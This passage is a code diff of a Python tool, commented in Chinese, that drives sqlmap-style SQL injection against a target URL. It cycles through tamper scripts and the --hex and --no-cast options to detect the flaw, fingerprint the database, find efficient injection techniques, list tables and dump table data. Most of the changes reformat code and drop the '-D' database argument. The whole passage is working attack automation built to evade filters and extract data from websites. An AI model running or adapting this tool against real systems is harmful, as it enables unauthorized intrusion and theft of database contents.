                         self.log_config_file, 'default', 'finished_command_list'))
-                    if sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
+                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + " -D " +
-                                  db_name + " -T " + table_name + " --dump --stop 3")
+                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                                                                 " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
-                            sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3")
+                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
                         has_entries = self.get_entries_from_log_file(self.log_file)
                         if has_entries == 1:
                             update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
-                                                         sm_hex_or_no_cast_command_with_tamper + " -D " + db_name + " -T " + table_name + " --dump --stop 3"])
+                                                         sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3"])
                             self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名的具体数据" %
-                                  (tamper_string, hex_or_no_cast),'red')
+                                                   (tamper_string, hex_or_no_cast), 'red')
                             flag = 1
 
             if flag == 1:
@@ -1455,7 +1510,7 @@ class Program(object):
             # return 0代表当前tamper没有达到目的
             return 0
 
-    def get_from_tuple(self,the_tuple):
+    def get_from_tuple(self, the_tuple):
         out = ""
         for i in range(len(the_tuple)):
             out += (the_tuple[i] + ',')
@@ -1503,11 +1558,12 @@ class Program(object):
         # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的
         # 如果当前函数没有达到目的则认为目标url不存在sqli漏洞,不再进行当前函数以后的函数检测
         if self.check_log_has_content(self.log_file) == True:
-            self.output.good_print("上次已经测试过这个目标url,并且已经得到有内容的log_file了,也即已经检测出该url是有sqli漏洞的,略过当前函数的处理过程",'red')
+            self.output.good_print(
+                "上次已经测试过这个目标url,并且已经得到有内容的log_file了,也即已经检测出该url是有sqli漏洞的,略过当前函数的处理过程", 'red')
             return 1
         else:
-            self.output.good_print("正常的注入语句无法检测到有sqli注入",'green')
-            self.output.good_print("尝试用--hex选项再检测是否有sqli注入...",'green')
+            self.output.good_print("正常的注入语句无法检测到有sqli注入", 'green')
+            self.output.good_print("尝试用--hex选项再检测是否有sqli注入...", 'green')
             current_finished_command_list = eval(get_key_value_from_config_file(
                 self.log_config_file, 'default', 'finished_command_list'))
             if self.sm_hex_command in current_finished_command_list:
@@ -1519,13 +1575,13 @@ class Program(object):
                                              'finished_command_list', current_finished_command_list)
 
                 if self.check_log_has_content(self.log_file) == True:
-                    self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了该url有sqli注入",'red')
+                    self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了该url有sqli注入", 'red')
                     if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                     return 1
 
-            self.output.good_print("尝试用--no-cast选项再检测是否有sqli注入...",'green')
+            self.output.good_print("尝试用--no-cast选项再检测是否有sqli注入...", 'green')
             current_finished_command_list = eval(get_key_value_from_config_file(
                 self.log_config_file, 'default', 'finished_command_list'))
             if self.sm_no_cast_command in current_finished_command_list:
@@ -1537,13 +1593,13 @@ class Program(object):
                                              'finished_command_list', current_finished_command_list)
 
                 if self.check_log_has_content(self.log_file) == True:
-                    self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入",'red')
+                    self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入", 'red')
                     if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                     return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper检测该url是否有slqi注入...",'green')
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper检测该url是否有slqi注入...", 'green')
             tamper_list = self.MYSQL + self.MSSQL + self.ACCESS + self.ORACLE + self.SQLITE + \
                 self.PGSQL + self.DB2 + self.FIREBIRD + self.MAXDB + self.SYBASE + self.HSQLDB
 
@@ -1557,7 +1613,8 @@ class Program(object):
                 else:
                     continue
             # 下面代表尝试每一个非组合tamper无法得到有内容的log_file
-            self.output.good_print("sorry,this url is no vulnerable in my eye,I will exit to save your time:)",'red')
+            self.output.good_print(
+                "sorry,this url is no vulnerable in my eye,I will exit to save your time:)", 'red')
             return 0
 
     def get_db_type_need_tamper(self):
@@ -1568,17 +1625,17 @@ class Program(object):
         # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
         # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的
-        self.output.good_print("目前为止已经检测到目标url有sqli漏洞,现在尝试获取数据库类型...",'yellow')
+        self.output.good_print("目前为止已经检测到目标url有sqli漏洞,现在尝试获取数据库类型...", 'yellow')
         db_type = self.get_db_type_from_log_file(self.log_file)
         if db_type != 0:
-            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库类型了,在之前的尝试检测出目标url有sqli漏洞的过程中已经得到了数据库类型",'red')
+            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库类型了,在之前的尝试检测出目标url有sqli漏洞的过程中已经得到了数据库类型", 'red')
             return 1
         else:
             # 之前没有得到数据库类型,现在尝试所有的非组合tamper获取数据库类型,直到所有非组合的tamper尝试完毕
             # 这里用于获取数据库类型,所以只尝试每种非组合的tamper,如果尝试完还得不到则默认数据库类型为MySQL
             if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                 # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
-                self.output.good_print("尝试用--hex选项再获取数据库类型...",'green')
+                self.output.good_print("尝试用--hex选项再获取数据库类型...", 'green')
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if self.sm_hex_command in current_finished_command_list:
@@ -1590,12 +1647,12 @@ class Program(object):
                                                  'finished_command_list', current_finished_command_list)
 
                     if self.get_db_type_from_log_file(self.log_file) != 0:
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了数据库类型",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了数据库类型", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取数据库类型...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取数据库类型...", 'green')
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if self.sm_no_cast_command in current_finished_command_list:
@@ -1607,7 +1664,7 @@ class Program(object):
                                                  'finished_command_list', current_finished_command_list)
 
                     if self.get_db_type_from_log_file(self.log_file) != 0:
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -1629,10 +1686,10 @@ class Program(object):
 
                     if self.get_db_type_from_log_file(self.log_file) != 0:
                         self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库类型" %
-                                hex_or_no_cast,'red')
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper获取数据库类型...",'green')
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper获取数据库类型...", 'green')
             tamper_list = self.MYSQL + self.MSSQL + self.ACCESS + self.ORACLE + self.SQLITE + \
                 self.PGSQL + self.DB2 + self.FIREBIRD + self.MAXDB + self.SYBASE + self.HSQLDB
 
@@ -1666,16 +1723,12 @@ class Program(object):
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
         # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的
 
-        self.output.good_print("目前为止已经获取到了数据库类型,现在尝试获得任意一种高效U|E|S注入方法...",'red')
-        db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
-        self.sm_command = self.sm_command + " --dbms=%s" % db_type
-        self.sm_hex_command = self.sm_hex_command + " --dbms=%s" % db_type
-        self.sm_no_cast_command = self.sm_no_cast_command + " --dbms=%s" % db_type
+        self.output.good_print("目前为止已经获取到了数据库类型,现在尝试获得任意一种高效U|E|S注入方法...", 'red')
 
         sqli_type = self.get_sqli_type_from_log_file(self.log_file)
         if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
             self.output.good_print("恭喜大爷, 不用进入这个函数尝试获取任意一种高效U|E|S注入方法了, 在之前的尝试检测出目标url有sqli\
-    漏洞的过程或者尝试获取数据库类型的过程中已经得到了一种以上的高效U|E|S注入方法",'red')
+    漏洞的过程或者尝试获取数据库类型的过程中已经得到了一种以上的高效U|E|S注入方法", 'red')
             return 1
         else:
             # 之前没有得到一种以上的高效注入方法,现在尝试组合tamper获取任意一种高效U|E|S高效注入方法,按照上面的注释
@@ -1694,10 +1747,10 @@ class Program(object):
 
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功获得了一种以上的高效注入方法",'red')
+                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功获得了一种以上的高效注入方法", 'red')
                         return 1
 
-                self.output.good_print("尝试用--hex选项获得任意一种高效注入方法...",'green')
+                self.output.good_print("尝试用--hex选项获得任意一种高效注入方法...", 'green')
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if self.sm_hex_command + " --technique=USE" in current_finished_command_list:
@@ -1710,12 +1763,12 @@ class Program(object):
 
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功获得了一种以上的高效注入方法",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功获得了一种以上的高效注入方法", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取任意一种高效注入方法...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取任意一种高效注入方法...", 'green')
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if self.sm_no_cast_command + " --technique=USE" in current_finished_command_list:
@@ -1728,7 +1781,7 @@ class Program(object):
 
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功获取了一种以上的高效注入方法",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功获取了一种以上的高效注入方法", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -1750,13 +1803,15 @@ class Program(object):
 
                     sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                     if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
-                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项获得了U|E|S一种以上的高效注入方法" % hex_or_no_cast,'red')
+                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项获得了U|E|S一种以上的高效注入方法" %
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试所有2种tamper组合以内的组合再加上几个比较好的3个以上的tamper组合来尝试获取E|U|S高效注入方法",'green')
+            self.output.good_print(
+                "--hex和--no-cast无果,正在尝试所有2种tamper组合以内的组合再加上几个比较好的3个以上的tamper组合来尝试获取E|U|S高效注入方法", 'green')
             # 下面从log_file文件中获取数据库类型来决定用什么数据库的tamper,如果没有找到数据库类型则用默
             # 认的MySQL数据库类型的tamper
-            db_type = eval(self.get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
 
             if db_type == 'MYSQL':
                 db_type_tamper_list = self.MYSQL
@@ -1807,10 +1862,10 @@ class Program(object):
         # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
         # 上面的这个self.has_good_sqli_type是前一步尝试获取高效注入方法的结果,如果=1说明有高效注入方法
-        self.output.good_print("目前为止已经尝试完获取高效注入方法,现在尝试获取当前url的数据库名...",'red')
+        self.output.good_print("目前为止已经尝试完获取高效注入方法,现在尝试获取当前url的数据库名...", 'red')
         db_name_list = self.get_db_name_from_log_file(self.log_file)
         if db_name_list != 0 and db_name_list != []:
-            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库名了,以前已经得到过了",'red')
+            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库名了,以前已经得到过了", 'red')
             return 1
         else:
             # 之前没有得到数据库名,现在尝试所有的组合tamper获取数据库名,直到所有组合的tamper尝试完毕
@@ -1822,7 +1877,8 @@ class Program(object):
                     if self.sm_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --current-db" + " --technique=USE")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_command + " --current-db" + " --technique=USE")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -1830,7 +1886,7 @@ class Program(object):
 
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
-                            self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名",'red')
+                            self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名", 'red')
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
@@ -1838,7 +1894,8 @@ class Program(object):
                 if self.sm_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --current-db" + " --technique=BQT")
+                    self.output.os_system_with_bottom_status(
+                        self.sm_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_command + " --current-db" + " --technique=BQT")
                     update_config_file_key_value(self.log_config_file, 'default',
@@ -1846,17 +1903,18 @@ class Program(object):
 
                     db_name_list = self.get_db_name_from_log_file(self.log_file)
                     if db_name_list != 0 and db_name_list != []:
-                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名",'red')
+                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名", 'red')
                         return 1
 
-                self.output.good_print("尝试用--hex选项再获取当前url的数据库名...",'green')
+                self.output.good_print("尝试用--hex选项再获取当前url的数据库名...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if self.sm_hex_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --current-db" + " --technique=USE")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_hex_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_hex_command + " --current-db" + " --technique=USE")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -1864,7 +1922,7 @@ class Program(object):
 
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
-                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名",'red')
+                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名", 'red')
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                             return 1
@@ -1874,7 +1932,8 @@ class Program(object):
                 if self.sm_hex_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --current-db" + " --technique=BQT")
+                    self.output.os_system_with_bottom_status(
+                        self.sm_hex_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_hex_command + " --current-db" + " --technique=BQT")
                     update_config_file_key_value(self.log_config_file, 'default',
@@ -1882,19 +1941,20 @@ class Program(object):
 
                     db_name_list = self.get_db_name_from_log_file(self.log_file)
                     if db_name_list != 0 and db_name_list != []:
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取当前url的数据库名...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取当前url的数据库名...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if self.sm_no_cast_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --current-db" + " --technique=USE")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_no_cast_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_no_cast_command + " --current-db" + " --technique=USE")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -1902,7 +1962,7 @@ class Program(object):
 
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
-                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名",'red')
+                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名", 'red')
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'hex_or_no_cast', ['--no-cast'])
                             return 1
@@ -1912,7 +1972,8 @@ class Program(object):
                 if self.sm_no_cast_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --current-db" + " --technique=BQT")
+                    self.output.os_system_with_bottom_status(
+                        self.sm_no_cast_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_no_cast_command + " --current-db" + " --technique=BQT")
                     update_config_file_key_value(self.log_config_file, 'default',
@@ -1920,7 +1981,7 @@ class Program(object):
 
                     db_name_list = self.get_db_name_from_log_file(self.log_file)
                     if db_name_list != 0 and db_name_list != []:
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名",'red')
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -1943,7 +2004,7 @@ class Program(object):
 
                         db_name_list = self.get_db_name_from_log_file(self.log_file)
                         if db_name_list != 0 and db_name_list != []:
-                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库名" % hex_or_no_cast,'red')
+                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库名" % hex_or_no_cast, 'red')
                             return 1
 
                 sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + " --current-db" + " --technique=BQT"
@@ -1960,13 +2021,13 @@ class Program(object):
                     db_name_list = self.get_db_name_from_log_file(self.log_file)
                     if db_name_list != 0 and db_name_list != []:
                         self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库名" %
-                                hex_or_no_cast,'red')
+                                               hex_or_no_cast, 'red')
                         return 1
 
-            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前url的数据库名...",'green')
-            #在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
-            #先判断返回是否为0
-            db_type = eval(self.get_key_value_from_config_file(self.log_config_file,'default','db_type'))
+            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前url的数据库名...", 'green')
+            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
+            # 先判断返回是否为0
+            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
             if db_type == 'MYSQL':
                 db_type_tamper_list = self.MYSQL
             elif db_type == 'MSSQL':
@@ -2005,12 +2066,11 @@ class Program(object):
         # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
         # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
         # 获得表名需要的tamper
-        self.output.good_print("目前为止已经尝试完获取当前url的数据库名,现在尝试获取当前数据库的表名...",'green')
-        # 当前已经获得url的数据库名,如下db_name
-        db_name = self.get_db_name_from_log_file(self.log_file)[0]
-        table_name= self.get_table_name_from_log_file(self.log_file)
-        if table_name!= 0 and table_name!= "":
-            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表名了,以前已经得到过了",'red')
+        self.output.good_print("目前为止已经尝试完获取当前url的数据库名,现在尝试获取当前数据库的表名...", 'green')
+        table_name = self.get_table_name_from_log_file(self.log_file)
+
+        if table_name != 0 and table_name != "":
+            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表名了,以前已经得到过了", 'red')
             return 1
         else:
             # 之前没有得到数据库表名,现在尝试所有的组合tamper获取数据库表名,直到所有组合的tamper尝试完毕
@@ -2020,77 +2080,81 @@ class Program(object):
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_command + " --technique=USE" + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if self.sm_command + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + " -D " + db_name + " --tables")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_command + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
-                            self.sm_command + " --technique=USE" + " -D " + db_name + " --tables")
+                            self.sm_command + " --technique=USE" + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
-                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了",'red')
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
+                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了", 'red')
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_command + " --technique=BQT" + " -D " + db_name + " --tables" in current_finished_command_list:
+                if self.sm_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + " -D " + db_name + " --tables")
+                    self.output.os_system_with_bottom_status(
+                        self.sm_command + " --technique=BQT" + " --tables")
                     current_finished_command_list.append(
-                        self.sm_command + " --technique=BQT" + " -D " + db_name + " --tables")
+                        self.sm_command + " --technique=BQT" + " --tables")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
-                    table_name= self.get_table_name_from_log_file(self.log_file)
-                    if table_name!= 0 and table_name!= "":
-                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了",'red')
+                    table_name = self.get_table_name_from_log_file(self.log_file)
+                    if table_name != 0 and table_name != "":
+                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了", 'red')
                         return 1
 
-                self.output.good_print("尝试用--hex选项再获取当前数据库的表名...",'green')
+                self.output.good_print("尝试用--hex选项再获取当前数据库的表名...", 'green')
                 if self.has_good_sqli_type == 1:
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
-                    if self.sm_hex_command + " --technique=USE" + " -D " + db_name + " --tables" in current_finished_command_list:
+                    if self.sm_hex_command + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + " -D " + db_name + " --tables")
+                        self.output.os_system_with_bottom_status(
+                            self.sm_hex_command + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
-                            self.sm_hex_command + " --technique=USE" + " -D " + db_name + " --tables")
+                            self.sm_hex_command + " --technique=USE" + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
-                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名",'red')
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
+                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名", 'red')
                             update_config_file_key_value(
                                 self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                             return 1
 
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
-                if self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " --tables" in current_finished_command_list:
+                if self.sm_hex_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " --tables")
+                    self.output.os_system_with_bottom_status(
+                        self.sm_hex_command + " --technique=BQT" + " --tables")
                     current_finished_command_list.append(
-                        self.sm_hex_command + " --technique=BQT" + " -D " + db_name + " --tables")
+                        self.sm_hex_command + " --technique=BQT" + " --tables")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
-                    table_name= self.get_table_name_from_log_file(self.log_file)
-                    if table_name!= 0 and table_name!= "":
-                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名",'red')
+                    table_name = self.get_table_name_from_log_file(self.log_file)
+                    if table_name != 0 and table_name != "":
+                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名", 'red')
                         update_config_file_key_value(
                             self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                         return 1
 
-                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表名...",'green')
+                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表名...", 'green')
                 if self.has_good_sqli_type == 1:
-                    cmd = self.sm_no_cast_command + " --technique=USE" + " -D " + db_name + " --tables"
+                    cmd = self.sm_no_cast_command + " --technique=USE" + " --tables"
                     current_finished_command_list = eval(get_key_value_from_config_file(
                         self.log_config_file, 'default', 'finished_command_list'))
                     if cmd in current_finished_command_list:
@@ -2101,14 +2165,14 @@ class Program(object):
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
 
-                        table_name= self.get_table_name_from_log_file(self.log_file)
-                        if table_name!= 0 and table_name!= "":
-                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名",'red')
+                        table_name = self.get_table_name_from_log_file(self.log_file)
+                        if table_name != 0 and table_name != "":
+                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名", 'red')
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'hex_or_no_cast', ['--no-cast'])
                             return 1
 
-                cmd = self.sm_no_cast_command + " --technique=BQT" + " -D " + db_name + " --tables"
+                cmd = self.sm_no_cast_command + " --technique=BQT" + " --tables"
                 current_finished_command_list = eval(get_key_value_from_config_file(
                     self.log_config_file, 'default', 'finished_command_list'))
                 if cmd in current_finished_command_list:
@@ -2119,9 +2183,9 @@ class Program(object):
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
 
-                    table_name= self.get_table_name_from_log_file(self.log_file)
-                    if table_name!= 0 and table_name!= "":
-                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名",'red')
+                    table_name = self.get_table_name_from_log_file(self.log_file)
+                    if table_name != 0 and table_name != "":
+                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名", 'red')
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
                         return 1
@@ -2132,7 +2196,7 @@ class Program(object):
                     self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                 if self.has_good_sqli_type == 1:
                     sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
